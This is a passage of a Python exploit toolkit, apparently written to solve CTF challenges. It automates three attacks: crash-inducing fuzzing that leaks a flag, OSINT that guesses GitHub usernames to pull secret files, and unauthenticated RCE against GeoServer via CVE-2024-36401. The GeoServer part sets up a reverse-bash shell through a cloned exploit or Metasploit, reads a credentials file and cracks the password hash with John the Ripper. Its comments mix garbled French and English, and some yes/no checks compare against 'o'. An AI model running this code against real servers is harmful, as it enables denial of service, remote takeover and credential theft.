# VULNERABILITY #3: Restricted - DoS + Info Disclosure
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit3_Restricted:
    """
    Exploitation of Restricted via Fuzzing:
    1. Exhaustive fuzzing (x,y,z) until crash
    2. Error page retrieval
    3. Base64 flag decoding
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #3: Restricted - DoS + Information Disclosure")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (default: restricted.rogue-sentinels.io): {Colors.ENDC}") or "restricted.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (default: 64375): {Colors.ENDC}") or "64375"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Target: {self.base_url}")
        
        # Ã‰tape 1: Reconnaissance
        print_info("\n[Ã‰tape 1] Reconnaissance...")
        self.recon()
        
        # Ã‰tape 2: Fuzzing exhaustif
        print_info("\n[Ã‰tape 2] Exhaustive fuzzing (x,y,z)...")
        crash_value = self.exhaustive_fuzzing()
        
        if crash_value:
            # Ã‰tape 3: Trigger crash and recover flag
            print_info("\n[Ã‰tape 3] Crash exploitation...")
            flag = self.exploit_crash(crash_value)
            
            if flag:
                print_flag(flag)
                pause()
                return flag
        
        pause()
        return None
    
    def recon(self):
        """Application reconnaissance"""
        try:
            r = self.session.get(self.base_url, timeout=10)
            print_success(f"Accessible application (Status: {r.status_code})")
            
            if 'adder' in r.text.lower() or 'calculator' in r.text.lower():
                print_info("Application: Ultimate Adder (Calculator)")
            
            # Test /calculate endpoint with normal request
            test_r = self.session.get(f"{self.base_url}/calculate", params={'x': 1, 'y': 1, 'z': 1}, timeout=5)
            if test_r.status_code == 200:
                print_success(f"Endpoint /calculate working (1+1+1 = {test_r.text.strip()})")
                
        except Exception as e:
            print_error(f"Error: {e}")
    
    def exhaustive_fuzzing(self):
        """Fuzzing exhaustif: teste (0,0,0), (0,0,1), ..., jusqu'au crash"""
        
        print_info("Fuzzing method:")
        print("  [1] Exhaustive fuzzing (0,0,0 â†’ 0,0,1 â†’ ... slow but complete)")
        print("  [2] Testing known value (42069)")
        print("  [3] Enter value manually")
        
        mode = input(f"{Colors.CYAN}Choice (1/2/3): {Colors.ENDC}") or "2"
        
        if mode == "2":
            # Direct test with sum = 42069
            print_info("Test with sum = 42069 (x=0, y=0, z=42069)...")
            try:
                r = self.session.post(
                    f"{self.base_url}/calculate",
                    data={'x': 0, 'y': 0, 'z': 42069},
                    timeout=5
                )
                if r.status_code >= 500:
                    print_success(f"Crash confirmed! (Status {r.status_code})")
                    print_success(f"Sum = 0 + 0 + 42069 = 42069")
                    return (0, 0, 42069)
                else:
                    print_info(f"Status {r.status_code} - sending additional requests...")
                    # Sometimes multiple requests needed to crash
                    for i in range(10):
                        try:
                            r2 = self.session.post(
                                f"{self.base_url}/calculate",
                                data={'x': 0, 'y': 0, 'z': 42069},
                                timeout=5
                            )
                            if r2.status_code >= 500:
                                print_success(f"Crash after {i+2} requests!")
                                return (0, 0, 42069)
                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                            print_success(f"Server crashed after {i+2} requests!")
                            return (0, 0, 42069)
                    
                    print_warning("No immediate crash...")
                    
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                print_success("Crash confirmed! (Timeout/Connection Error)")
                return (0, 0, 42069)
            except Exception as e:
                print_warning(f"Error: {e}")
            
            # Demander si on veut continuer
            cont = input(f"{Colors.YELLOW}Use anyway (0,0,42069)? (y/n): {Colors.ENDC}")
            if cont.lower() == 'o':
                return (0, 0, 42069)
            mode = "1"
        
        if mode == "3":
            x = int(input(f"{Colors.YELLOW}Value x: {Colors.ENDC}") or "42069")
            y = int(input(f"{Colors.YELLOW}Value y: {Colors.ENDC}") or "0")
            z = int(input(f"{Colors.YELLOW}Value z: {Colors.ENDC}") or "0")
            return (x, y, z)
        
        if mode == "1":
            # Exhaustive fuzzing - increment sum progressively
            print_info("Starting exhaustive fuzzing...")
            print_info("Le crash arrive quand x + y + z = valeur magique")
            print_info("Test: (0,0,0)â†’(0,0,1)â†’(0,0,2)â†’...â†’(0,0,N)â†’(0,1,0)â†’...")
            print_warning("Ctrl+C pour arrÃªter.")
            print()
            
            tested = 0
            max_val = 999999  # Limit for each variable
            
            try:
                # Method 1: Test z alone first (x=0, y=0, z=0â†’max)
                # This is the fastest method to reach 42069
                print_info("Phase 1: Test with z alone (x=0, y=0, z=0â†’999999)...")
                
                for z in range(0, max_val):
                    tested += 1
                    
                    if z % 1000 == 0:
                        print(f"  z={z} (sum={z})...", end='\r')
                    
                    if self.test_crash(0, 0, z):
                        print()
                        print_success(f"CRASH FOUND! x=0, y=0, z={z}")
                        print_success(f"Sum = 0 + 0 + {z} = {z}")
                        return (0, 0, z)
                
                print()
                print_info("Phase 2: Exhaustive full test...")
                
                # Method 2: Test all combinations by increasing sum
                for target_sum in range(0, 100000):
                    # Generate combinations that give this sum
                    # We test just a few combinations per sum to go fast
                    test_cases = [
                        (target_sum, 0, 0),
                        (0, target_sum, 0),
                        (0, 0, target_sum),
                        (target_sum // 2, target_sum - target_sum // 2, 0),
                        (target_sum // 3, target_sum // 3, target_sum - 2 * (target_sum // 3)),
                    ]
                    
                    for x, y, z in test_cases:
                        if x > 999999 or y > 999999 or z > 999999:
                            continue
                        if x < 0 or y < 0 or z < 0:
                            continue
                            
                        tested += 1
                        
                        if self.test_crash(x, y, z):
                            print()
                            print_success(f"CRASH FOUND! x={x}, y={y}, z={z}")
                            print_success(f"Sum = {x} + {y} + {z} = {x+y+z}")
                            return (x, y, z)
                    
                    if target_sum % 5000 == 0:
                        print(f"  Sum tested: {target_sum}...", end='\r')
                        
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Fuzzing interrupted{Colors.ENDC}")
                
                manual = input(f"{Colors.YELLOW}Enter values manually? (y/n): {Colors.ENDC}")
                if manual.lower() == 'y':
                    x = int(input(f"{Colors.YELLOW}x: {Colors.ENDC}") or "0")
                    y = int(input(f"{Colors.YELLOW}y: {Colors.ENDC}") or "0")
                    z = int(input(f"{Colors.YELLOW}z: {Colors.ENDC}") or "42069")
                    return (x, y, z)
        
        return None
    
    def test_crash(self, x, y, z):
        """Test if a combination causes a crash"""
        try:
            r = self.session.post(
                f"{self.base_url}/calculate",
                data={'x': x, 'y': y, 'z': z},
                timeout=5
            )
            # Status 200 = NO crash, server works normally
            # Crash = 500, 502, 503, 504 or timeout/connection error
            if r.status_code == 200:
                return False  # No crash
            elif r.status_code >= 500:
                print_info(f"  Status {r.status_code} for ({x},{y},{z})")
                return True  # Server crash
            else:
                return False  # Other status (404, etc.) not a crash
                
        except requests.exceptions.Timeout:
            print_info(f"  TIMEOUT for ({x},{y},{z}) - Server not responding!")
            return True  # Timeout = server crashed
        except requests.exceptions.ConnectionError:
            print_info(f"  CONNECTION ERROR for ({x},{y},{z}) - Server down!")
            return True  # Connection error = server crashed
        except Exception as e:
            return False
    
    def exploit_crash(self, crash_value):
        """Trigger crash and recover flag"""
        
        x, y, z = crash_value
        
        # Step 1: Trigger the crash (may require multiple requests)
        print_info(f"Triggering crash with x={x}, y={y}, z={z}...")
        
        for i in range(10):
            try:
                self.session.post(
                    f"{self.base_url}/calculate",
                    data={'x': x, 'y': y, 'z': z},
                    timeout=3
                )
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                print_success(f"Server crashed after {i+1} request(s)!")
                break
            except:
                pass
        
        # Step 2: Wait for the error page to appear
        print_info("Waiting for error page...")
        time.sleep(2)
        
        # Step 3: Retrieve the main page (which should display the error)
        print_info("Error page retrieval (GET on /)...")
        
        # Use a new session to avoid connection issues
        new_session = requests.Session()
        
        try:
            r = new_session.get(self.base_url, timeout=10)
            error_content = r.text
            
            print_info(f"Status: {r.status_code}")
            print_info(f"Length response: {len(error_content)} characters")
            
            # Display the full content
            print_info("\n" + "="*60)
            print_info("ERROR PAGE CONTENT:")
            print("="*60)
            print(error_content)
            print("="*60 + "\n")
            
            # Search for Base64 strings (characteristic: ends with = or ==)
            # Improved pattern to find strings in JS/HTML
            b64_patterns = [
                r"'([A-Za-z0-9+/]{10,}={1,2})'",   # Between single quotes
                r'"([A-Za-z0-9+/]{10,}={1,2})"',   # Between double quotes
                r': ([A-Za-z0-9+/]{10,}={1,2})',   # After colon
                r'([A-Za-z0-9+/]{20,}={1,2})',     # General long pattern
            ]
            
            all_matches = []
            for pattern in b64_patterns:
                matches = re.findall(pattern, error_content)
                all_matches.extend(matches)
            
            # Deduplicate
            all_matches = list(set(all_matches))
            
            if all_matches:
                print_success(f"Found {len(all_matches)} potential Base64 string(s):")
                
                for i, b64 in enumerate(all_matches):
                    print(f"\n  [{i+1}] {b64}")
                    
                    try:
                        decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                        print_success(f"      Decoded: {decoded}")
                        
                        # Search for flag
                        if 'flag' in decoded.lower() or 'FLAG' in decoded:
                            flag_match = re.search(r'FLAG[_\-\w]+', decoded, re.I)
                            if flag_match:
                                return flag_match.group(0)
                            return decoded.strip()
                            
                    except Exception as e:
                        print_warning(f"      Error dÃ©codage: {e}")
            
            # If not found automatically
            print_warning("\nNo flag automatically decoded.")
            print_info("Look for suspicious string ending with '==' in page")
            print_info("Example: RkxBR19zb21ldGhpbmc9PQ==")
            
        except Exception as e:
            print_error(f"Error rÃ©cupÃ©ration page: {e}")
            print_info("Server may still be down...")
        
        # Ask manually
        b64_manual = input(f"\n{Colors.YELLOW}Base64 string to decode (copy-paste): {Colors.ENDC}")
        
        if b64_manual:
            try:
                decoded = base64.b64decode(b64_manual).decode('utf-8')
                print_success(f"Decoded: {decoded}")
                return decoded.strip()
            except Exception as e:
                print_error(f"Error dÃ©codage: {e}")
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNERABILITY #4: Staging (Liberty) - OSINT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit4_Staging:
    """
    OSINT exploitation of Staging (Liberty):
    1. Source code analysis to find the developer
    2. Automatic GitHub search
    3. Exploration of repositories
    4. Retrieval of the flag in sensitive files
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.developer_name = None
        self.github_username = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #4: Staging (Liberty) - OSINT")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (default: staging.rogue-sentinels.io): {Colors.ENDC}") or "staging.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (default: 19480): {Colors.ENDC}") or "19480"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Target: {self.base_url}")
        
        # Step 1: Source code analysis
        print_info("\n[Step 1] Source code analysis...")
        if not self.analyze_source():
            print_error("Unable to find developer")
            pause()
            return None
        
        # Step 2: Automatic GitHub search
        print_info("\n[Step 2] Automatic GitHub search...")
        if not self.find_github_username():
            # Manual fallback
            print_warning("Automatic search failed")
            print_info("Manual LinkedIn/GitHub search required")
            self.github_username = input(f"{Colors.YELLOW}GitHub username: {Colors.ENDC}")
            
            if not self.github_username:
                pause()
                return None
        
        # Step 3: Exploration of GitHub repositories
        print_info("\n[Step 3] GitHub repositories exploration...")
        flag = self.explore_github_repos()
        
        if flag:
            print_flag(flag)
        
        pause()
        return flag
    
    def analyze_source(self):
        """Analyzing the source code to find the developer"""
        
        try:
            r = self.session.get(self.base_url, timeout=10)
            
            print_success("Page accessible")
            html = r.text
            
            # Search for JS scripts
            scripts = re.findall(r'src=["\']([^"\']+\.js)["\']', html)
            
            for script in scripts:
                print_info(f"Script found: {script}")
                
                # Download the script
                if not script.startswith('http'):
                    script_url = f"{self.base_url}/{script.lstrip('/')}"
                else:
                    script_url = script
                
                try:
                    js_r = self.session.get(script_url, timeout=5)
                    js_content = js_r.text
                    
                    print_info(f"\n--- Content de {script} ---")
                    print(js_content[:500])
                    print("---\n")
                    
                    # Search for author patterns
                    author_patterns = [
                        r'(?://|/\*+)\s*(?:Author|Auteur|DÃ©veloppeur|Developer|Created by|By)[\s:]+([^\n\*]+)',
                        r'@author\s+([^\n]+)',
                    ]
                    
                    for pattern in author_patterns:
                        authors = re.findall(pattern, js_content, re.I)
                        for author in authors:
                            author = author.strip()
                            if author and len(author) > 3:
                                print_success(f"Developer found: {author}")
                                self.developer_name = author
                                return True
                    
                    # Search for company
                    companies = re.findall(r'([\w\s]+(?:Planners|Corp|Inc|LLC|Company|Wealth)[\w\s]*)', js_content)
                    for company in companies:
                        print_info(f"Company: {company.strip()}")
                    
                except Exception as e:
                    print_warning(f"Error reading script: {e}")
            
            # Ask manually if not found
            if not self.developer_name:
                self.developer_name = input(f"{Colors.YELLOW}Developer name trouvÃ© manuellement: {Colors.ENDC}")
                return bool(self.developer_name)
                
        except Exception as e:
            print_error(f"Error: {e}")
            return False
        
        return True
    
    def find_github_username(self):
        """Endd GitHub username automatically"""
        
        if not self.developer_name:
            return False
        
        print_info(f"GitHub search for: {self.developer_name}")
        
        # PRIORITY: Real CTF username FIRST
        priority_usernames = [
            "DiamondHunter153",  # Real CTF username - TESTED FIRST
        ]
        
        # List of potential usernames based on the name
        name_parts = self.developer_name.split()
        potential_usernames = []
        
        if len(name_parts) >= 2:
            first = name_parts[0]
            last = name_parts[1]
            
            potential_usernames = [
                first.lower() + last.lower(),
                first.lower() + last[0].lower(),
                first[0].lower() + last.lower(),
                first.lower() + "-" + last.lower(),
                first.lower() + "_" + last.lower(),
                last.lower() + first.lower(),
                first.lower() + last.lower() + "123",
            ]
        
        # Add common variations
        for username in potential_usernames[:]:
            potential_usernames.append(username.replace(" ", ""))
            potential_usernames.append(username.replace(" ", "-"))
            potential_usernames.append(username.replace(" ", "_"))
        
        # Combine: priorities FIRST
        all_usernames = priority_usernames + potential_usernames
        
        # Test each username
        print_info(f"Testing {len(all_usernames)} potential usernames...")
        
        for username in all_usernames:
            try:
                r = self.session.get(f"https://github.com/{username}", timeout=5)
                
                if r.status_code == 200 and 'Page not found' not in r.text:
                    print_success(f"GitHub profile found: {username}")
                    self.github_username = username
                    return True
                    
            except:
                pass
        
        # If not found, try a Google search
        print_info("Attempting web search...")
        try:
            from urllib.parse import quote
            search_query = f"{self.developer_name} GitHub developer"
            # We can't really do a Google search here without an API
            # but we can provide instructions
            print_info(f"Search manually: {search_query}")
        except:
            pass
        
        return False
    
    def explore_github_repos(self):
        """Explore GitHub repositories to find secrets"""
        
        if not self.github_username:
            return None
        
        print_info(f"Exploring github.com/{self.github_username}")
        
        # DIRECT: Go immediately to landing-page/alpha.crt
        print_info("\n[DIRECT ACCESS] landing-page/alpha.crt")
        
        for branch in ['main', 'master']:
            raw_url = f"https://raw.githubusercontent.com/{self.github_username}/landing-page/{branch}/alpha.crt"
            
            try:
                print_info(f"Tentative: {raw_url}")
                r = self.session.get(raw_url, timeout=10)
                
                if r.status_code == 200:
                    content = r.text
                    print_success(f"âœ“ File found sur branche '{branch}'!")
                    print_info("\nContent de alpha.crt:")
                    print(content)
                    print()
                    
                    # Search for the flag with the exact pattern: -- ${FLAG_OSINTcertified}
                    flag_match = re.search(r'--\s*\$\{([^}]+)\}', content)
                    if flag_match:
                        flag = flag_match.group(1)
                        print_success(f"FLAG FOUND: {flag}")
                        return flag
                    
                    # Alternative pattern
                    flag_match2 = re.search(r'(FLAG[_\w]+)', content, re.I)
                    if flag_match2:
                        flag = flag_match2.group(1)
                        print_success(f"FLAG FOUND: {flag}")
                        return flag
                        
            except Exception as e:
                print_warning(f"Branch {branch}: {e}")
        
        print_error("Unable to access landing-page/alpha.crt")
        return None
    
    def explore_repo_files(self, username, repo_name):
        """Explore repository files"""
        
        try:
            # GitHub API to list files
            api_url = f"https://api.github.com/repos/{username}/{repo_name}/contents"
            r = self.session.get(api_url, timeout=10)
            
            if r.status_code != 200:
                return None
            
            files = r.json()
            
            # Iterate over files
            for file_info in files:
                if isinstance(file_info, dict):
                    filename = file_info.get('name', '')
                    file_type = file_info.get('type', '')
                    
                    print(f"    - {filename}")
                    
                    # Suspicious files to examine
                    suspicious_extensions = ['.crt', '.pem', '.key', '.env', '.txt', '.md']
                    suspicious_names = ['secret', 'credential', 'password', 'flag', 'alpha', 'config']
                    
                    is_suspicious = any(ext in filename.lower() for ext in suspicious_extensions)
                    is_suspicious = is_suspicious or any(name in filename.lower() for name in suspicious_names)
                    
                    if is_suspicious and file_type == 'file':
                        print_warning(f"      âš ï¸ Suspicious file: {filename}")
                        
                        # Download content
                        raw_url = f"https://raw.githubusercontent.com/{username}/{repo_name}/main/{filename}"
                        
                        # Also try 'master' if 'main' doesn't work
                        for branch in ['main', 'master']:
                            raw_url = f"https://raw.githubusercontent.com/{username}/{repo_name}/{branch}/{filename}"
                            
                            try:
                                content_r = self.session.get(raw_url, timeout=5)
                                
                                if content_r.status_code == 200:
                                    content = content_r.text
                                    
                                    print_info(f"      Content de {filename}:")
                                    print(f"{content[:800]}")
                                    
                                    # Search for flag
                                    flag_patterns = [
                                        r'\$\{FLAG[_\w]+\}',
                                        r'FLAG[_\-\w]+',
                                        r'flag[_\-\w]+',
                                    ]
                                    
                                    for pattern in flag_patterns:
                                        flag_match = re.search(pattern, content, re.I)
                                        if flag_match:
                                            flag = flag_match.group(0)
                                            print_success(f"      FLAG TROUVÃ‰: {flag}")
                                            return flag
                                    
                                    break  # If we were able to download, no need to try the other branch
                                    
                            except Exception as e:
                                pass
            
        except Exception as e:
            print_warning(f"Error exploration repo: {e}")
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNERABILITY #5: WebServices - CVE-2024-36401 GeoServer
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit5_WebServices:
    """
    Exploitation CVE-2024-36401 on GeoServer:
    1. Automatic identification of GeoServer
    2. Automatic retrieval of local IP
    3. Automatic exploitation (Python or Metasploit)
    4. Automatic retrieval and cracking of the hash
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.local_ip = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #5: WebServices - CVE-2024-36401 GeoServer RCE")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (default: webservices.rogue-sentinels.io): {Colors.ENDC}") or "webservices.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (default: 8080): {Colors.ENDC}") or "8080"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Target: {self.base_url}")
        
        # Step 1: Reconnaissance
        print_info("\n[Step 1] GeoServer reconnaissance...")
        version = self.recon()
        
        # Step 2: Local IP retrieval
        print_info("\n[Step 2] Local IP retrieval...")
        self.get_local_ip()
        
        # Step 3: Choice of exploitation method
        print_info("\n[Step 3] Choice of exploitation method...")
        print("  [1] Python script (automatic)")
        print("  [2] Metasploit (automatic)")
        print("  [3] Manual")
        
        choice = input(f"{Colors.CYAN}Method (1/2/3): {Colors.ENDC}") or "1"
        
        if choice == "1":
            success = self.exploit_python()
        elif choice == "2":
            success = self.exploit_metasploit()
        elif choice == "3":
            success = self.exploit_manual()
        else:
            success = self.exploit_metasploit()
        
        if not success:
            print_error("Exploitation failed")
            pause()
            return None
        
        # Step 4: Retrieval of credentials
        print_info("\n[Step 4] Retrieval of credentials...")
        creds = self.get_credentials_auto()
        
        # Step 5: Crack the hash
        print_info("\n[Step 5] Crack the hash...")
        password = self.crack_hash_auto(creds)

        if password:
            username = creds.get('username', 'admin')
            flag = f"{username}:{password}"
            print_flag(flag)
            pause()
            return flag
        
        pause()
        return None
    
    def recon(self):
        """Automatic reconnaissance of GeoServer"""
        
        paths = ['/geoserver', '/geoserver/web', '/']
        
        for path in paths:
            try:
                r = self.session.get(f"{self.base_url}{path}", timeout=10)
                
                if 'geoserver' in r.text.lower():
                    print_success(f"GeoServer detected: {path}")
                    
                    # Version
                    version_match = re.search(r'GeoServer\s*([\d\.]+)', r.text)
                    if version_match:
                        version = version_match.group(1)
                        print_success(f"Version: {version}")
                        return version
                    
                    return "Unknown"
            except:
                pass
        
        print_warning("GeoServer not detected, continuing anyway...")
        return None
    
    def get_local_ip(self):
        """Automatic retrieval of local IP"""
        
        try:
            # Method 1: via socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
            print_success(f"Local IP detected: {self.local_ip}")
            return True
        except:
            pass
        
        try:
            # Method 2: via hostname
            hostname = socket.gethostname()
            self.local_ip = socket.gethostbyname(hostname)
            print_success(f"Local IP detected: {self.local_ip}")
            return True
        except:
            pass
        
        # Method 3: parser ifconfig/ip addr
        try:
            result = run_command("ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1")
            if result and result.strip():
                self.local_ip = result.strip()
                print_success(f"Local IP detected: {self.local_ip}")
                return True
        except:
            pass
        
        # Fallback: ask manually
        print_warning("Unable to detect local IP automatically")
        self.local_ip = input(f"{Colors.YELLOW}Enter your local IP: {Colors.ENDC}")
        return bool(self.local_ip)
    
    def exploit_python(self):
        """Automatic exploitation with Python script"""
        
        print_info("\n=== EXPLOITATION WITH PYTHON SCRIPT (VENV) ===")
        
        exploit_dir = "./webservices/files/CVE-2024-36401"
        venv_python = f"{exploit_dir}/venv/bin/python3"
        
        # Check if the exploit already exists
        if not os.path.exists(exploit_dir):
            print_info("Cloning exploit...")
            result = run_command("git clone https://github.com/jakabakos/CVE-2024-36401 ./webservices/files/CVE-2024-36401", timeout=30)
            
            if "fatal" in result.lower() or not os.path.exists(exploit_dir):
                print_error("Clone failed")
                return False
            
            print_success("Exploit cloned")
        else:
            print_success("Exploit already present")
        
        # Check if the venv exists, otherwise create it
        if not os.path.exists(venv_python):
            print_info("Creating virtual environment...")
            result = run_command(f"cd {exploit_dir} && python3 -m venv venv", timeout=30)
            print_success("Virtual environment created")

        # Always install/check dependencies
        print_info("Installing/checking dependencies...")
        result = run_command(f"cd {exploit_dir} && ./venv/bin/pip install -r requirements.txt", timeout=120)

        if "successfully installed" in result.lower() or "requirement already satisfied" in result.lower():
            print_success("Dependencies installed")
        else:
            print_warning("Problem installing dependencies")
            print_info(f"Result:\n{result[:300]}")
            # Retry with forced reinstall
            print_info("Trying forced reinstall...")
            result = run_command(f"cd {exploit_dir} && ./venv/bin/pip install --force-reinstall -r requirements.txt", timeout=120)
            if "successfully installed" in result.lower():
                print_success("Dependencies successfully reinstalled")
        
        # Launch the listener in the background
        lport = 1337
        print_info(f"Starting listener on port {lport}...")
        
        listener_cmd = f"nc -lvnp {lport}"
        print_info(f"Command: {listener_cmd}")
        
        # Create listener script
        listener_script = f"/tmp/listener_{lport}.sh"
        with open(listener_script, 'w') as f:
            f.write(f"#!/bin/bash\n{listener_cmd}\n")
        os.chmod(listener_script, 0o755)
        
        print_warning("Open a NEW terminal and run:")
        print(f"{Colors.CYAN}{listener_cmd}{Colors.ENDC}")
        print()
        
        input(f"{Colors.YELLOW}Appuyez sur EntrÃ©e once listener is running...{Colors.ENDC}")
        
        # Lancer l'exploit avec le Python du venv
        print_info("Launching exploit...")
        
        # Use relative path of venv Python (since we're already in exploit_dir after cd)
        exploit_cmd = f"cd {exploit_dir} && ./venv/bin/python3 exploit_fix.py -u {self.base_url} -ip {self.local_ip} -rp {lport}"
        print_info(f"Command: {exploit_cmd}")
        print_info(f"Python used: ./venv/bin/python3 (relative to {exploit_dir})")
        
        # Run exploit en arriÃ¨re-plan
        print_info("Execution de l'exploit (cela peut prendre 10-30 secondes)...")
        result = run_command(exploit_cmd, timeout=60)
        
        print_info(f"Result:\n{result[:500]}")
        
        if "error" in result.lower() or "traceback" in result.lower():
            print_warning("Errors occurred, check listener")
            print_info(f"Details:\n{result}")
        
        print_info("\nCheck your listener. If you have a shell:")
        print("  1. Type: ls -la")
        print("  2. Type: cat ADMIN_CREDENTIALS.txt")
        print()
        
        has_shell = input(f"{Colors.YELLOW}Did you get a shell? (y/n): {Colors.ENDC}")
        return has_shell.lower() == 'o'
    
    def exploit_metasploit(self):
        """Automatic exploitation with Metasploit"""
        
        print_info("\n=== EXPLOITATION WITH METASPLOIT ===")
        
        # Check if msfconsole is installed
        result = run_command("which msfconsole", timeout=5)
        if not result or "not found" in result:
            print_error("Metasploit is not installed")
            return False
        
        print_success("Metasploit detected")
        
        # Create Metasploit commands file
        lport = 1337
        rc_file = "/tmp/geoserver_exploit.rc"
        
        rc_content = f"""use exploit/multi/http/geoserver_unauth_rce_cve_2024_36401
set RHOSTS {self.base_url.replace('http://', '').replace('https://', '').split(':')[0]}
set RPORT {self.base_url.split(':')[-1]}
set LHOST {self.local_ip}
set LPORT {lport}
set PAYLOAD cmd/unix/reverse_bash
set VERBOSE true
exploit
"""
        
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        print_info(f"Metasploit configuration created: {rc_file}")
        print_info("Launching Metasploit...")
        
        msf_cmd = f"msfconsole -q -r {rc_file}"
        print_info(f"Command: {msf_cmd}")
        
        print_warning("\nMetasploit will launch in new terminal...")
        print_info("Once shell is obtained, type:")
        print("  ls")
        print("  cat ADMIN_CREDENTIALS.txt")
        print()
        
        # Launch Metasploit
        os.system(f"gnome-terminal -- bash -c '{msf_cmd}; exec bash' 2>/dev/null || xterm -e '{msf_cmd}' 2>/dev/null || {msf_cmd}")
        
        has_shell = input(f"\n{Colors.YELLOW}Did you get a shell? (y/n): {Colors.ENDC}")
        return has_shell.lower() == 'o'
    
    def exploit_manual(self):
        """Manual exploitation instructions"""
        
        lport = 1337
        
        print_info("\n=== MANUAL EXPLOITATION ===")
        print()
        print("1. Clone exploit:")
        print(f"   {Colors.CYAN}git clone https://github.com/Chocapikk/CVE-2024-36401.git{Colors.ENDC}")
        print()
        print("2. Start listener:")
        print(f"   {Colors.CYAN}nc -lvnp {lport}{Colors.ENDC}")
        print()
        print("3. Run exploit:")
        print(f"   {Colors.CYAN}python3 exploit_fix.py -u {self.base_url} -ip {self.local_ip} -rp {lport}{Colors.ENDC}")
        print()
        
        input(f"{Colors.YELLOW}Press Enter once the shell is obtained...{Colors.ENDC}")
        return True
    
    def get_credentials_auto(self):
        """Automatic/interactive credentials retrieval"""
        
        print_info("In the shell, credentials should be in ADMIN_CREDENTIALS.txt")
        print()
        print("Commands to execute:")
        print(f"  {Colors.CYAN}ls -la{Colors.ENDC}")
        print(f"  {Colors.CYAN}cat ADMIN_CREDENTIALS.txt{Colors.ENDC}")
        print()
        
        username = input(f"{Colors.YELLOW}Username found: {Colors.ENDC}") or "admin"
        password_hash = input(f"{Colors.YELLOW}Password hash: {Colors.ENDC}")
        
        return {'username': username, 'hash': password_hash}
    
    def crack_hash_auto(self, creds):
        """Automatic hash cracking"""
        
        password_hash = creds.get('hash', '').strip()
        
        if not password_hash:
            print_error("No hash provided")
            return None
        
        print_info(f"Hash: {password_hash}")
        print_info(f"Length: {len(password_hash)} characters")
        
        # Identify type
        if len(password_hash) == 64:
            hash_type = "sha256"
            hashcat_mode = "1400"
        elif len(password_hash) == 32:
            hash_type = "md5"
            hashcat_mode = "0"
        elif len(password_hash) == 40:
            hash_type = "sha1"
            hashcat_mode = "100"
        else:
            hash_type = "unknown"
            hashcat_mode = "0"
        
        print_info(f"Type detected: {hash_type.upper()}")

        # Phase 1: Use repository wordlist
        print_info(f"\n[Phase 1] Cracking with repository wordlist ({len(COMMON_PASSWORDS)} passwords)...")

        import hashlib

        for pwd in COMMON_PASSWORDS:
            if hash_type == "sha256":
                test_hash = hashlib.sha256(pwd.encode()).hexdigest()
            elif hash_type == "md5":
                test_hash = hashlib.md5(pwd.encode()).hexdigest()
            elif hash_type == "sha1":
                test_hash = hashlib.sha1(pwd.encode()).hexdigest()
            else:
                continue

            if test_hash == password_hash:
                print_success(f"PASSWORD FOUND: {pwd}")
                return pwd

        print_warning("Not found in repository wordlist")
        
        # Phase 2: Try with John if available
        print_info("\n[Phase 2] Trying with John The Ripper...")
        
        if run_command("which john", timeout=5):
            hash_file = "/tmp/hash_to_crack.txt"
            with open(hash_file, 'w') as f:
                f.write(password_hash)
            
            john_cmd = f"john --format=raw-{hash_type} --wordlist=/usr/share/wordlists/rockyou.txt {hash_file} --max-run-time=60"
            print_info(f"Command: {john_cmd}")
            
            result = run_command(john_cmd, timeout=70)
            
            # Get result
            show_cmd = f"john --show --format=raw-{hash_type} {hash_file}"
            show_result = run_command(show_cmd, timeout=5)
            
            if show_result and ":" in show_result:
                password = show_result.split(':')[-1].strip()
